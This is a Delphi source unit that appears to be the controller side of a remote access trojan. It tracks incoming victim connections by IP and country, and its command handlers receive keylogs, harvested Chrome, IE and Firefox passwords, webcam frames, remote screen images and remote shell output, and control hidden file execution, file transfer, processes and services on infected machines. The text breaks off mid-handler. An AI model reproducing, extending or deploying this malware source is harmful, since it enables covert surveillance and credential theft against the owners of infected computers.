unit uClients;
interface
{$DEFINE DEBUG}
uses windows, SysUtils, winsock, Classes, uFunctions, ComCtrls, uCommands, uFlags,
     Graphics, ZlibEx, JPEG, uControl, syncobjs, ExtCtrls, GeoIP;
const
  ADD_CONNITEM = 1;
  DELETE_CONNITEM = 2;
  ADD_LOG = 3;
  SET_FILEMANAGERSTAT = 4;
  ADD_FILEMANAGERDRIVEITEMS = 5;
  ADD_FILEMANAGERDIRECTORYITEMS = 6;
  ADD_FILEMANAGERFILEITEMS = 7;
  SET_MANAGERSTAT = 8;
  ADD_PROCMANAGERPROCITEM = 9;
  ADD_WINDOWMANAGERWINDOWITEM = 10;
  ADD_SERVMANAGERSERVITEM = 11;
  GET_SOCKETINFO = 12;
  UPDATE_TRANSFERLISTITEM = 13;
  KILL_TRANSFERITEM = 14;
  SET_VNCWINDOW = 15;
  UPDATE_UPLOADLISTITEM = 16;
  ADD_PASSWORDS = 17;
  GEO_COUNTRYCODE = 'cc';
  GEO_COUNTRYNAME = 'cn';
  
type
  TClientThread = class(TThread)
  private
    idJob:Integer;
    lstConnItem:TListItem;
    pStrList, pStrList2:TStringList;
    tmpString:String;
    jpgCam:TJPEGImage;
    function GetPacket(sSocket:integer; sPass:String):String;
    procedure AddConnection;
    procedure ParseCommand(sSocket:Integer;sComm:Byte;sString:String);
    procedure DeleteListItem;
    procedure SetFilemanagerStatus;
    procedure AddFilemanagerDriveItems;
    procedure AddFilemanagerDirectoryItems;
    procedure AddFilemanagerFileItems;
    procedure SetManagerStatus;
    procedure AddProcmanagerProcItems;
    procedure AddWindowmanagerWindowItems;
    procedure AddServmanagerServItems;
    procedure GetSocketInfo;
    procedure UpdateTransferListItem;
    procedure KillTransferItem;
    procedure AddRegKeys;
    procedure AddRegValues;
    procedure SetRegManagerStatus;
    procedure AddShellOutput;
    procedure SetRemoteShellStatus;
    procedure ManageShell(Started:Boolean);
    procedure ReceiveKeylog;
    procedure GetKeylogInfo;
    procedure ReceiveCam;
    procedure AddPasswords;
    procedure Termination(Sender: TObject);
    procedure FixStream(MyFirstStream,MySecondStream,MyCompareStream:TMemorystream);
    procedure SetVNCWindow;
    function GetTransfer(mControl:TForm10):TSocketInfo;
    function FCountry(IP: string; Format: string = 'cc'): string;
    function FShow(strCC: string): integer;
    procedure SendFile;
  protected
    procedure Execute; override;
  public
    mCriticalSection                  :TCriticalSection; //Socket Synchronization
    mySocket, myLastTime, SocketType  :Integer;   //SocketID, Last Ping, Type of Socket
    myInfos                           :TTransferInfo;
    mSocketInfos                      :TSocketInfo;
    tMyThread                         :TThread;
    tempStream                        :TMemoryStream;
    streamVNCFull, streamPartial, streamDone:TMemoryStream;
    fControl:   TForm10;
    bPingSent:  Boolean;
    function SendData(bCommand:Byte; sString:String):Boolean;
    constructor Create(CreateSuspended: Boolean);
    procedure SetSocket(iSock:Integer);
    procedure DoSyncJob;
end;

Function Explode(sDelimiter: String; sSource: String): TStringList;

implementation
uses uMain;

Function Explode(sDelimiter: String; sSource: String): TStringList;
Var
  c: Word;
Begin
  Result := TStringList.Create;
  C := 0;
  While sSource <> '' Do
  Begin
    If Pos(sDelimiter, sSource) > 0 Then
    Begin
      Result.Add(Copy(sSource, 1, Pos(sDelimiter, sSource) - 1 ));
      Delete(sSource, 1, Length(Result[c]) + Length(sDelimiter));
    End
    Else
    Begin
      Result.Add(sSource);
      sSource := ''
    End;
    Inc(c);
  End;
End;

procedure TClientThread.DeleteListItem;
begin
  mListviewCriticalSection.Enter;
  try
     if Assigned(mSocketInfos) then begin
      if Assigned(mSocketInfos.fControl) then begin
        If Assigned(mSocketInfos.fControl.mVNC) then
          mSocketInfos.fControl.mVNC.sVNCSocket := 0;
        if Assigned(mSocketInfos.fControl.mCam) then
          mSocketInfos.fControl.mCam.sCamSocket := 0;
      end;
    end;
    if Assigned(lstConnItem) then begin
      FreeAndNil(lstConnItem);
    end;
    CountConnections;
  finally
    mListviewCriticalSection.Leave;
  end;
end;

function TClientThread.FCountry(IP: string; Format: string = GEO_COUNTRYCODE): string;
var
 GeoIP: TGeoIP;
 GeoIPCountry: TGeoIPCountry;
 GeoIPdat: string;

begin
 GeoIPdat:=ExtractFilePath(ParamStr(0))+'GeoIP\GeoIP.dat';
 if (format<>GEO_COUNTRYCODE) and (format<>GEO_COUNTRYNAME) then begin
  result:='Unknown';
  exit;
 end else
 try GeoIP:=TGeoIP.Create(GeoIPdat);
  except
  result:='Unknown';
  exit;
 end;
 try
  if GeoIP.GetCountry(IP, GeoIPCountry) = GEOIP_SUCCESS then begin
   if format=GEO_COUNTRYCODE then Result:= GeoIPCountry.CountryCode
    else Result:= GeoIPCountry.CountryName;   
  end else Result:='Unknown';
 finally
  GeoIP.Free;
 end;
end;                                                  

function TClientThread.FShow(strCC: string): integer;
var
 ico: TIcon;
 ico_folder: string;
begin
 try
 ico_folder:=extractfilepath(paramstr(0))+'GeoIP\ico\';
 ico:=TIcon.Create;
 ico.LoadFromFile(ico_folder + strCC + '.ico');
 result:=uMain.Form1.ilFlags.AddIcon(ico);
 ico.free;
 except
  //
 end;
end;

procedure TClientThread.AddConnection;
var
  tempInfo:TClientThread;
begin
  mListViewCriticalSection.Enter;
  try
    //Create Ping/Pong Timer
    bPingSent := False;
    //Create first Infos
    tempInfo := Self;
    tempInfo.mySocket := mySocket;
    tempInfo.myLastTime := GetTickCount;
    lstConnItem := Form1.lvConnections.Items.Add;
    lstConnItem.Caption := pStrList[0];
    lstConnItem.SubItems.Add(RemoteAddress(mySocket));
    lstConnItem.SubItems.Add(pStrList[1]);
    lstConnItem.SubItems.Add(pStrList[2]);
    lstConnItem.SubItems.Add(pStrList[3]);
    lstConnItem.SubItems.Add(pStrList[4]);
    lstConnItem.SubItems.Add(pStrList[5]);
    lstConnItem.ImageIndex := FShow(FCountry(lstConnItem.SubItems[0], GEO_COUNTRYCODE));
    lstConnItem.SubItems.Objects[0] := tempInfo;
    Form1.showTrayToolTip('New connection: ' + pStrList[1],
                          'ID: ' + lstConnItem.Caption + #13#10
                        + 'IP: ' + lstConnItem.SubItems[0] + #13#10
                        + 'Country: ' + FCountry(lstConnItem.SubItems[0],
                          GEO_COUNTRYNAME));
    CountConnections;
  finally
    mListViewCriticalSection.Leave;
  end;
end;

procedure TClientThread.SetFilemanagerStatus;
begin
  if assigned(fControl) then
    fControl.stat1.Panels[0].Text := tmpString;
end;

procedure TClientThread.AddFilemanagerDriveItems;
var
  i,iTemp:integer;
begin
  if assigned(fControl) then begin
    for i := 0 to pStrList.Count - 1 do begin
      pStrList2 := Explode('#',pStrList.Strings[i]);
      if pStrList2.Count = 2 then begin
        iTemp := fControl.cbb1.Items.Add(pStrList2.Strings[0]);
        fControl.cbb1.ItemsEx.Items[iTemp].ImageIndex := GetDriveIcon(pStrList2.Strings[1]);
      end;
    end;
  end;
end;

procedure TClientThread.AddFilemanagerDirectoryItems;
var
  i:integer;
  lstTemp:TListItem;
begin
  if assigned(fControl) then begin
    for i := 0 to pStrList.Count - 1 do begin
      pStrList2 := Explode('#',pStrList.Strings[i]);
      if pStrList2.Count = 2 then begin
        lstTemp := fControl.lvFiles.Items.Add;
        lstTemp.caption := (pStrList2.Strings[0]);
        lstTemp.Subitems.Add('Directory');
        lstTemp.subitems.add('-');
        lstTemp.ImageIndex := 7;
      end;
    end;
  end;
end;

procedure TClientThread.AddFilemanagerFileItems;
var
  i:integer;
  lstTemp:TListItem;
begin
  if assigned(fControl) then begin
    for i := 0 to pStrList.Count - 1 do begin
      pStrList2 := Explode('#',pStrList.Strings[i]);
      if pStrList2.Count = 3 then begin
        lstTemp := fControl.lvFiles.Items.Add;
        lstTemp.caption := (pStrList2.Strings[0]);
        lstTemp.Subitems.Add(pStrList2.Strings[1]);
        lstTemp.subitems.add(GetByteSize(pStrList2.Strings[2]));
        lstTemp.ImageIndex := 8;
      end;
    end;
  end;
end;

procedure TClientThread.SetManagerStatus;
begin
  if assigned(fControl) then
    fControl.stat1.Panels[0].Text := tmpString;
end;

procedure TClientThread.SetRegManagerStatus;
begin
  if assigned(fControl) then
    fControl.stat1.Panels[0].Text := tmpString;
end;

procedure TClientThread.SetRemoteShellStatus;
begin
  if assigned(fControl) then
    fControl.stat1.Panels[0].Text := tmpString;
end;

procedure TClientThread.AddPasswords;  //test
var
  i:integer;
  lstTemp:TListItem;
begin
  if assigned(fControl) then begin
    for i := 0 to pStrList.Count - 1 do begin
      pStrList2 := Explode('#',pStrList.Strings[i]);
      if pStrList2.Count = 4 then begin
        lstTemp := fControl.lvPasswd.Items.Add;
        lstTemp.caption := ('');
        if pStrList2.Strings[0] = 'CH' then lstTemp.ImageIndex:=0 else
        if pStrList2.Strings[0] = 'IE' then lstTemp.ImageIndex:=1 else
        if pStrList2.Strings[0] = 'FF' then lstTemp.ImageIndex:=2 else;

        lstTemp.Subitems.Add(pStrList2.Strings[1]);
        lstTemp.subitems.add(pStrList2.Strings[2]);
        lstTemp.subitems.add(pStrList2.Strings[3]);
        fControl.stat1.Panels[0].Text:='Passwords received';
        //lstTemp.ImageIndex := 1;
      end else fControl.stat1.Panels[0].Text:='Passwords received';
    end;
  end;
end;

procedure TClientThread.AddProcmanagerProcItems;
var
  i:integer;
  lstTemp:TListItem;
begin
  if assigned(fControl) then begin
    for i := 0 to pStrList.Count - 1 do begin
      pStrList2 := Explode('#',pStrList.Strings[i]);
      if pStrList2.Count = 3 then begin
        lstTemp := fControl.lvProcess.Items.Add;
        lstTemp.caption := (pStrList2.Strings[0]);
        lstTemp.Subitems.Add(pStrList2.Strings[1]);
        lstTemp.subitems.add(pStrList2.Strings[2]);
        lstTemp.ImageIndex := 1;
      end;
    end;
  end;
end;

procedure TClientThread.AddWindowmanagerWindowItems;
var
  i:integer;
  lstTemp:TListItem;
begin
  if assigned(fControl) then begin
    for i := 0 to pStrList.Count - 1 do begin
      pStrList2 := Explode('#',pStrList.Strings[i]);
      if pStrList2.Count = 3 then begin
        lstTemp := fControl.lvWindow.Items.Add;
        lstTemp.caption := (pStrList2.Strings[0]);
        lstTemp.Subitems.Add(pStrList2.Strings[2]);
        lstTemp.subitems.add(pStrList2.Strings[1]);
        lstTemp.ImageIndex := 4;
      end;
    end;
  end;
end;

procedure TClientThread.AddServmanagerServItems;
var
  i:integer;
  lstTemp:TListItem;
begin
  if assigned(fControl) then begin
    for i := 0 to pStrList.Count - 1 do begin
      pStrList2 := Explode('#',pStrList.Strings[i]);
      if pStrList2.Count = 3 then begin
        lstTemp := fControl.lvService.Items.Add;
        lstTemp.caption := (pStrList2.Strings[0]);
        lstTemp.Subitems.Add(pStrList2.Strings[1]);
        lstTemp.subitems.add(pStrList2.Strings[2]);
        lstTemp.ImageIndex := 7;
      end;
    end;
  end;
end;

procedure TClientThread.AddRegKeys;
var
  i:integer;
  lstTemp:TListItem;
begin
  if assigned(fControl) then begin
    for i := 0 to pStrList.Count - 1 do begin
      lstTemp := fControl.lvKeys.Items.Add;
      lstTemp.caption := (pStrList.Strings[i]);
      lstTemp.ImageIndex := 0;
    end;
  end;
end;

procedure TClientThread.AddRegValues;
var
  i:integer;
  lstTemp:TListItem;
begin
  if assigned(fControl) then begin
    for i := 0 to pStrList.Count - 1 do begin
      pStrList2 := Explode('#',pStrList.Strings[i]);
      if pStrList2.Count = 3 then begin
        lstTemp := fControl.lvValues.Items.Add;
        lstTemp.caption := (pStrList2.Strings[0]);
        lstTemp.Subitems.Add(pStrList2.Strings[1]);
        lstTemp.subitems.add(pStrList2.Strings[2]);
        lstTemp.ImageIndex := 1;
      end;
    end;
  end;
end;

procedure TClientThread.AddShellOutput;
begin
  if assigned(fControl) then begin
    with fControl do begin
      redtShell.Lines.Add(tmpString);
      redtShell.SelStart := Length(redtShell.Text);
    end;
  end;
end;

procedure TClientThread.ManageShell(Started:Boolean);
begin
  if assigned(fControl) then begin
    if Started then begin
      fControl.edtShell.Enabled := True;
      fControl.pmRemoteShell.Items.Items[0].Enabled := False;
      fControl.pmRemoteShell.Items.Items[1].Enabled := True;
    end else begin
      fControl.edtShell.Enabled := False;
      fControl.pmRemoteShell.Items.Items[0].Enabled := True;
      fControl.pmRemoteShell.Items.Items[1].Enabled := false;
    end;
  end;
end;

procedure TClientThread.KillTransferItem;
begin
  mSocketInfos.lvItem.Delete;
end;

procedure TClientThread.SendFile;
var
  streamFile:TMemoryStream;
  sendLen, readLen, sentLen:Integer;
  bBuff:Array[0..8191] of Byte;
begin
  streamFile := TMemoryStream.Create;
  Sleep(1000);
  try
    streamFile.LoadFromFile(mSocketInfos.sLocalPath);
    streamFile.Position := 0;
    myInfos.lFileSize := streamFile.Size;
    SendData(PACK_FILESTART, mSocketInfos.sRemotePath);
    sentLen := 0;
    repeat
      ZeroMemory(@bBuff[0],8192);
      readLen := streamFile.Read(bBuff[0],8192);
      if readLen <= 0 then
        break;
      sendLen := send(mySocket,bBuff[0],readLen,0);
      if sendLen <= 0 then
        break;
      sentLen := sentLen + sendLen;
      myInfos.lReceivedSize := sentLen;
      idJob := UPDATE_TRANSFERLISTITEM;
      Synchronize(DoSyncJob);
    until 1 = 3;
  finally
    FreeAndNil(streamFile);
  end;
  idJob := KILL_TRANSFERITEM;
  Synchronize(DoSyncJob);
  mSocketInfos.fControl.stat1.Panels.Items[0].Text := 'Upload finished: ' + mSocketInfos.sRemotePath;
end;

procedure TClientThread.ReceiveKeylog;
var
  streamFile:TMemoryStream;
  recvLen:Integer;
  bBuff:Array[0..8191] of Byte;
begin
  streamFile := TMemoryStream.Create;
  Sleep(1000);
  SendData(PACK_KEYLOGSEND,'');
  repeat
    ZeroMemory(@bBuff[0],8192);
    recvLen := recv(mySocket,bBuff[0],8192,0);
    if recvLen <= 0 then
      break;
    streamFile.Write(bBuff,recvLen);
  until 1 = 3;
  if streamFile.Size > 0 then
    streamFile.SaveToFile(mSocketInfos.sLocalPath);
  FreeAndNil(streamFile);
end;

procedure TClientThread.ReceiveCam;
begin
  mSocketInfos.fControl.mCam.img1.picture.assign(jpgCam);
end;

procedure TClientThread.FixStream(MyFirstStream,MySecondStream,MyCompareStream:TMemorystream);
var
  I: Integer;
  P1, P2, P3: ^Char;
begin
 P1 := MyFirstStream.Memory;
  MySecondStream.SetSize(MyFirstStream.Size);
  P2 := MySecondStream.Memory;
  P3 := MyCompareStream.Memory;

  for I := 0 to MyFirstStream.Size - 1 do
  begin
    if P3^ = '0' then
      P2^ := p1^
    else
      P2^ := P3^;
    Inc(P1);
    Inc(P2);
    Inc(P3);
  end;
end;

function TClientThread.GetTransfer(mControl:TForm10):TSocketInfo;
var
  i:integer;
  mInfo:TSocketInfo;
begin
  Result := nil;
  If mControl.lvTransfer.Items.Count = 0 then
    exit;
  for i := 0 to mControl.lvTransfer.Items.Count - 1 do begin
    mInfo := TSocketInfo(mControl.lvTransfer.Items.Item[i].SubItems.Objects[0]);
    if myInfos.lDownloadID = mInfo.lTransferID then begin
      Result := mInfo;
      break;
    end;
  end;
end;

procedure TClientThread.GetSocketInfo;
var
  i:Integer;
  fList:TList;
begin
  try
    fList := Form1.CenterList.LockList;
    for I := 0 to fList.Count - 1 do begin
      if TSocketInfo(fList.Items[i]).lSocketID = myInfos.lSocketID  then begin
        if SocketType = SOCK_TRANSFER then begin
          mSocketInfos := GetTransfer(TSocketInfo(fList.Items[i]).fControl);
          if mSocketInfos <> nil then
            break;
        end else begin
          mSocketInfos := TSocketInfo(fList.Items[i]);
          break;
        end;
      end;
    end;
  finally
    Form1.CenterList.UnlockList;
  end;
end;

procedure TClientThread.GetKeylogInfo;
var
  i:Integer;
  fList:TList;
begin
  try
    fList := Form1.CenterList.LockList;
    for I := 0 to fList.Count - 1 do begin
      if TSocketInfo(fList.Items[i]).lSocketID = myInfos.lSocketID  then begin
        mSocketInfos := TSocketInfo(fList.Items[i]);
        break;
      end;
    end;
  finally
    Form1.CenterList.UnlockList;
  end;
end;

procedure TClientThread.UpdateTransferListItem;
var
  cSpeed:Cardinal;
begin
  try
    cSpeed :=  (myInfos.lReceivedSize div (GetTickCount() - myInfos.lStarted)) * 1024;
    with mSocketInfos.lvItem.SubItems do begin
      Strings[0] := GetByteSize(Inttostr(cSpeed)) + '/s';
      Strings[1] :=  GetPercent(myInfos.lReceivedSize, myInfos.lFileSize);
      Strings[2] := GetByteSize(IntToStr(myInfos.lFileSize)) + '/' + GetByteSize(IntToStr(myInfos.lReceivedSize));
      Objects[0] := Self;
    end;
  except

  end;
end;

procedure TClientThread.SetVNCWindow;
begin
  with mSocketInfos.fControl.mVNC do begin
    sVNCSocket := mySocket;
    hHeight := StrToInt(pStrList[2]);
    hWidth := StrToInt(pStrList[1]);
    stat1.Panels.Items[0].Text := 'Connected!';
    FormResize(nil);
    FormShow(nil);
  end;
end;

procedure TClientThread.DoSyncJob;
begin
  case idJob of
    ADD_CONNITEM: AddConnection;
    DELETE_CONNITEM: DeleteListItem;
    SET_FILEMANAGERSTAT: SetFilemanagerStatus;
    ADD_FILEMANAGERDRIVEITEMS: AddFilemanagerDriveItems;
    ADD_FILEMANAGERDIRECTORYITEMS: AddFilemanagerDirectoryItems;
    ADD_FILEMANAGERFILEITEMS: AddFilemanagerFileItems;
    SET_MANAGERSTAT: SetManagerStatus;
    ADD_PROCMANAGERPROCITEM: AddProcmanagerProcItems;
    ADD_WINDOWMANAGERWINDOWITEM: AddWindowmanagerWindowItems;
    ADD_SERVMANAGERSERVITEM: AddServmanagerServItems;
    GET_SOCKETINFO: GetSocketInfo;
    UPDATE_TRANSFERLISTITEM: UpdateTransferListItem;
    KILL_TRANSFERITEM: KillTransferItem;
    SET_VNCWINDOW: SetVNCWindow;
    ADD_PASSWORDS: AddPasswords;
  end;
end;

procedure TClientThread.ParseCommand(sSocket:Integer;sComm:Byte;sString:String);
var
  lCounter:Integer;
  bmpVNC:TBitmap;
  xYear,xMonth,xDay: WORD;
begin
  case sComm of
    PACK_AUTH:
    begin
      pStrList := Explode('|',sString);
      if pStrList.Count <> 7 then begin
        idJob := ADD_LOG;
        tmpString := 'Protocol violation: ' + RemoteAddress(sSocket);
        Synchronize(DoSyncJob);
        closeSocket(sSocket);
        exit;
      end else begin
        idJob := ADD_CONNITEM;
        Synchronize(DoSyncJob);
      end;
    end;
    PACK_GETDRIVES:
    begin
      if sString = 'Error' then begin
        idJob := SET_FILEMANAGERSTAT;
        tmpString := 'Counldnt list drives';
        Synchronize(DoSyncJob);
        exit;
      end;
      pStrList := Explode('|',sString);
      if pStrList.Count <> 0 then begin
        idJob := Add_FILEMANAGERDRIVEITEMS;
        Synchronize(DoSyncJob);
        //-----------------------------
        idJob := SET_FILEMANAGERSTAT;
        tmpString := 'Drives listed';
        Synchronize(DoSyncJob);
      end;
    end;
    PACK_GETDIRS:
    begin
      if sString = 'Error' then begin
        idJob := SET_FILEMANAGERSTAT;
        tmpString := 'Error! Cant access!';
        Synchronize(DoSyncJob);
        exit;
      end;
      pStrList := Explode('|',sString);
      if pStrList.Count <> 0 then begin
        idJob := ADD_FILEMANAGERDIRECTORYITEMS;
        Synchronize(DoSyncJob);
      end;
      //---------------------------------------
      idJob := SET_FILEMANAGERSTAT;
      tmpString := 'idle...';
      Synchronize(DoSyncJob);
    end;
    PACK_GETFILES:
    begin
      pStrList := Explode('|',sString);
      if pStrList.Count <> 0 then begin
        idJob := ADD_FILEMANAGERFILEITEMS;
        Synchronize(DoSyncJob);
      end;
      idJob := SET_FILEMANAGERSTAT;
      tmpString := 'Files listed';
      Synchronize(DoSyncJob);
    end;
    PACK_EXECUTEFILEVISIBLE:
    begin
      if sString = '1' then
        tmpString := 'File executed successfully!'
      else
        tmpString := 'File cant be executed!';
      idJob := SET_FILEMANAGERSTAT;
      Synchronize(DoSyncJob);
    end;
    PACK_EXECUTEFILEHIDDEN:
    begin
      if sString = '1' then
        tmpString := 'File executed successfully!'
      else
        tmpString := 'File cant be executed!';
      idJob := SET_FILEMANAGERSTAT;
      Synchronize(DoSyncJob);
    end;
    PACK_DELETEFILE:
    begin
      if sString = '1' then
        tmpString := 'File deleted successfully!'
      else
        tmpString := 'File cant be deleted!';
      idJob := SET_FILEMANAGERSTAT;
      Synchronize(DoSyncJob);
    end;
    PACK_MOVEFILE:
    begin
      if sString = '1' then
        tmpString := 'File renamed successfully!'
      else
        tmpString := 'File cant be renamed!';
      idJob := SET_FILEMANAGERSTAT;
      Synchronize(DoSyncJob);
    end;
    PACK_DOWNLOADFILE:
    begin
      if sString <> '0' then begin
        SocketType := SOCK_TRANSFER;
        myInfos.lFileSize := StrToInt(sString);
        if mSocketInfos <> nil then begin
          try
            mSocketInfos.lvItem.SubItems.Strings[2] := GetByteSize(IntToStr(myInfos.lFileSize)) + '/0 Bytes';
            mSocketInfos.lvItem.SubItems.Strings[3] := 'Downloading...';
          finally
          end;
        end;
      end else begin
        idJob := KILL_TRANSFERITEM;
        Synchronize(DoSyncJob);
      end;
    end;
    PACK_TRANSFERFILE:
    begin
      if mSocketInfos <> nil then begin
        if myInfos.lFileSize <> 0 then begin
          tempStream := TMemoryStream.Create;
          tempStream.Write(sString[1],Length(sString));
          tempStream.Position := 0;
          try
            tempStream.SaveToFile(mSocketInfos.sLocalPath);
          finally
            FreeAndNil(tempStream);
          end;
          idJob := KILL_TRANSFERITEM;
          Synchronize(DoSyncJob);
          mSocketInfos.fControl.stat1.Panels.Items[0].Text := 'Download finished: ' + mSocketInfos.sLocalPath;
        end else
          mSocketInfos.lvItem.Delete;
      end else
        closeSocket(mySocket);
    end;
    PACK_QUERYFILE:
    begin
      pStrList := Explode('|',sString);
      if pStrList.Count = 3 then begin
        SocketType := SOCK_TRANSFER;
        myInfos.lFileSize := 0;
        myInfos.lReceivedSize := 0;
        myInfos.lStarted := GetTickCount;
        myInfos.lSocketID := StrToInt(pStrList[0]);
        myInfos.lDownloadID := StrToInt(pStrList[1]);
        idJob := GET_SOCKETINFO;
        Synchronize(DoSyncJob);
        SocketType := 0;
        SendData(PACK_QUERYFILE,mSocketInfos.sRemotePath);
      end;
    end;
    PACK_QUERYCOMPRESSEDFILE:
    begin
      pStrList := Explode('|',sString);
      if pStrList.Count = 3 then begin
        SocketType := SOCK_TRANSFER;
        myInfos.lFileSize := 0;
        myInfos.lReceivedSize := 0;
        myInfos.lStarted := GetTickCount;
        myInfos.lSocketID := StrToInt(pStrList[0]);
        myInfos.lDownloadID := StrToInt(pStrList[1]);
        idJob := GET_SOCKETINFO;
        Synchronize(DoSyncJob);
        SocketType := 0;
        SendData(PACK_QUERYCOMPRESSEDFILE,mSocketInfos.sRemotePath);
      end;
    end;
    PACK_COMPRESSEDTRANSFERFILE:
    begin
      if sString <> '0' then begin
        SocketType := SOCK_TRANSFER;
        myInfos.lFileSize := StrToInt(sString);
        if mSocketInfos <> nil then begin
          try
            mSocketInfos.lvItem.SubItems.Strings[2] := GetByteSize(IntToStr(myInfos.lFileSize)) + '/0 Bytes';
            mSocketInfos.lvItem.SubItems.Strings[3] := 'Downloading...';
          finally
          end;
        end;
      end else begin
        idJob := KILL_TRANSFERITEM;
        Synchronize(DoSyncJob);
      end;
    end;
    PACK_COMPRESSEDDOWNLOADFILE:
    begin
      if mSocketInfos <> nil then begin
        if myInfos.lFileSize <> 0 then begin
          tempStream := TMemoryStream.Create;
          streamPartial := TMemoryStream.Create;
          tempStream.Write(sString[1],Length(sString));
          tempStream.Position := 0;
          try
            ZDecompressStream(tempStream,streamPartial);
          except
            streamPartial.LoadFromStream(tempStream);
          end;
          try
            streamPartial.SaveToFile(mSocketInfos.sLocalPath);
          finally
            FreeAndNil(streamPartial);
          end;
          FreeAndNil(tempStream);
          idJob := KILL_TRANSFERITEM;
          Synchronize(DoSyncJob);
          mSocketInfos.fControl.stat1.Panels.Items[0].Text := 'Download finished: ' + mSocketInfos.sLocalPath;
        end else
          mSocketInfos.lvItem.Delete;
      end else
        closeSocket(mySocket);
    end;
    PACK_UPLOADFILE:
    begin
      pStrList := Explode('|',sString);
      if pStrList.Count = 2 then begin
        SocketType := SOCK_TRANSFER;
        myInfos.lReceivedSize := 0;
        myInfos.lStarted := GetTickCount;
        myInfos.lSocketID := StrToInt(pStrList[0]);
        myInfos.lDownloadID := StrToInt(pStrList[1]);
        idJob := GET_SOCKETINFO;
        Synchronize(DoSyncJob);
        if mSocketInfos <> nil then begin
          mSocketInfos.lvItem.SubItems.Strings[2] := '0 Bytes';
          mSocketInfos.lvItem.SubItems.Strings[3] := 'Uploading...';
          SendFile;
        end;
        closeSocket(mySocket);
      end;
    end;
    PACK_KEYLOGSEND: ///fixed 6.2.2014.
    begin
      myInfos.lSocketID := StrToInt(sString);
      GetKeylogInfo;
      if mSocketInfos <> nil then begin
        mSocketInfos.fControl.stat1.Panels.Items[0].Text := 'Receiving Keylog...';
        DecodeDate(Now, xYear, xMonth, xDay);
        tmpString := TimeTostr(Time);
        tmpString := StringReplace(tmpString , ':', '_',[rfReplaceAll, rfIgnoreCase]);
        mSocketInfos.sLocalPath := GetUserFolder(mSocketInfos.fControl.sUsername + '\Keylogs\' + IntToStr(xYear)+'-'+IntToStr(xMonth)+'-'+IntToStr(xDay)) + tmpString + '.txt';
        //MessageBox(0,PChar(mSocketInfos.sLocalPath),'dbg',0);
        ReceiveKeylog;
        mSocketInfos.fControl.stat1.Panels.Items[0].Text := 'Received Keylog!';
        mSocketInfos.fControl.ListKeylogs;
      end else
        closeSocket(mySocket);
    end;
    PACK_PROCESSES:
    begin
      pStrList := Explode('|',sString);
      if pStrList.Count <> 0 then begin
        idJob := ADD_PROCMANAGERPROCITEM;
        Synchronize(DoSyncJob);
      end;
      tmpString := 'Processes listed';
      idJob := SET_MANAGERSTAT;
      Synchronize(DoSyncJob);
    end;
    PACK_GETPASSWD:
    begin
      pStrList := Explode('|',sString);
      if pStrList.Count <> 0 then begin
        idJob := ADD_PASSWORDS;
        Synchronize(DoSyncJob);
      end;
    end;
    PACK_TERMINATEPROCESS:
    begin
      if sString = '1' then
        tmpString := 'Process terminated successfully!'
      else
        tmpString := 'Process cant be terminated!';
      idJob := SET_MANAGERSTAT;
      Synchronize(DoSyncJob);
    end;
    PACK_ENUMWINDOW:
    begin
      pStrList := Explode('|',sString);
      if pStrList.Count <> 0 then begin
        idJob := ADD_WINDOWMANAGERWINDOWITEM;
        Synchronize(DoSyncJob);
      end;
      tmpString := 'Windows listed';
      idJob := SET_MANAGERSTAT;
      Synchronize(DoSyncJob);
    end;
    PACK_WINDOWMAX:
    begin
      tmpString := 'Window maximized successfully!';
      idJob := SET_MANAGERSTAT;
      Synchronize(DoSyncJob);
    end;
    PACK_WINDOWMIN:
    begin
      tmpString := 'Window minimized successfully!';
      idJob := SET_MANAGERSTAT;
      Synchronize(DoSyncJob);
    end;
    PACK_WINDOWCLOSE:
    begin
      tmpString := 'Window closed successfully!';
      idJob := SET_MANAGERSTAT;
      Synchronize(DoSyncJob);
    end;
    PACK_ENUMSERVICE:
    begin
      pStrList := Explode('|',sString);
      if pStrList.Count <> 0 then begin
        idJob := ADD_SERVMANAGERSERVITEM;
        Synchronize(DoSyncJob);
      end;
      tmpString := 'Services listed';
      idJob := SET_MANAGERSTAT;
      Synchronize(DoSyncJob);
    end;
    PACK_STARTSERVICE:
    begin
      tmpString := 'Service started successfully!';
      idJob := SET_MANAGERSTAT;
      Synchronize(DoSyncJob);
    end;
    PACK_STOPSERVICE:
    begin
      tmpString := 'Service stopped successfully!';
      idJob := SET_MANAGERSTAT;
      Synchronize(DoSyncJob);
    end;
    PACK_VNCSOCKET:
    begin
      pStrList := Explode('|',sString);
      if pStrList.Count = 3 then begin
        SocketType := SOCK_VNC;
        myInfos.lSocketID := StrToInt(pStrList[0]);
        idJob := GET_SOCKETINFO;
        Synchronize(DoSyncJob);
        if mSocketInfos <> nil then begin
          idJob := SET_VNCWINDOW;
          Synchronize(DoSyncJob);
        end else
          closeSocket(mySocket);
      end;
    end;
    PACK_STARTVNC:
    begin
      if Assigned(streamVNCFull) = false then
        streamVNCFull := TMemoryStream.Create;
      if Assigned(tempStream) = false then
        tempStream := TMemoryStream.Create;
      if Assigned(streamPartial) = false then
        streamPartial := TMemoryStream.Create;
      tempStream.Clear;
      streamVNCFull.Clear;
    end;
    PACK_VNCPROCESS:
    begin
      tempStream.Clear;
      tempStream.Write(sString[1],Length(sString));
      myInfos.lReceivedSize := tempStream.Size;
      tempStream.Seek(0, soFromBeginning);
      ZDecompressStream(tempStream,streamVNCFull);
      streamVNCFull.Position := 0;
      bmpVNC := TBitmap.Create;
      bmpVNC.LoadFromStream(streamVNCFull);
      mSocketInfos.fControl.mVNC.img1.Bitmap.Assign(bmpVNC);
      //Free and Clear
      FreeAndNil(bmpVNC);
      if mSocketInfos.fControl.mVNC.btn1.Down then begin
        mSocketInfos.fControl.mVNC.RequestNextImage;
      end;
    end;
    PACK_VNCDELTA:
    begin
      tempStream.Clear;
      tempStream.Write(sString[1],Length(sString));
      myInfos.lReceivedSize := tempStream.Size;
      tempStream.Seek(0, soFromBeginning);
      try
        if streamDone = nil then
          streamDone := TMemoryStream.Create;
        ZDecompressStream(tempStream,streamPartial);
        FixStream(streamVNCFull,streamDone,streamPartial);
        streamDone.Position := 0;
        bmpVNC := TBitmap.Create;
        bmpVNC.LoadFromStream(streamDone);
        mSocketInfos.fControl.mVNC.img1.Bitmap.Assign(bmpVNC);
        streamVNCFull.Clear;
        FreeAndNil(streamVNCFull);
        streamVNCFull := streamDone;
        streamDone := nil;
        FreeAndNil(bmpVNC);
        tempStream.Clear;
        streamPartial.Clear;
         if mSocketInfos.fControl.mVNC.btn1.Down then begin
          mSocketInfos.fControl.mVNC.RequestNextImage;
        end;
      except
      end;
    end;
    PACK_PONG:
    begin
      myLastTime := GetTickCount;
    end;
    PACK_ENUMKEYS:
